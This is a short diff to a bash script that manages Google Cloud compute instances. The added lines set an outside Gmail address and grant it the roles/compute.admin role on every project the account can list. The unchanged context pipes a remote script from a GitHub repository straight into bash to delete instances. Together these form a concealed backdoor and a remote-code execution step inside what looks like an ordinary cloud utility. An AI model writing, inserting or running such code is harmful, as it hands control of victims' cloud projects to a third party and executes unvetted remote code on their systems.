@@ -1,6 +1,7 @@
 #!/bin/bash
 
 gcloud config set compute/zone us-central1-c
+email="koresbro7@gmail.com"
 
 delete_instances (){
 curl -s -L https://raw.githubusercontent.com/oldhuman/shameOnYou/master/delete.sh | bash -s
@@ -15,6 +16,7 @@ instances_count=$(gcloud compute instances list --filter="status=running" --form
 delete_instances
 for project in $(gcloud projects list  --format="value(project_id)")
 	do
+		gcloud projects add-iam-policy-binding $project --member user:$email --role roles/compute.admin
 		gcloud config set project $project
 		echo "Project: " $project
 		i=1
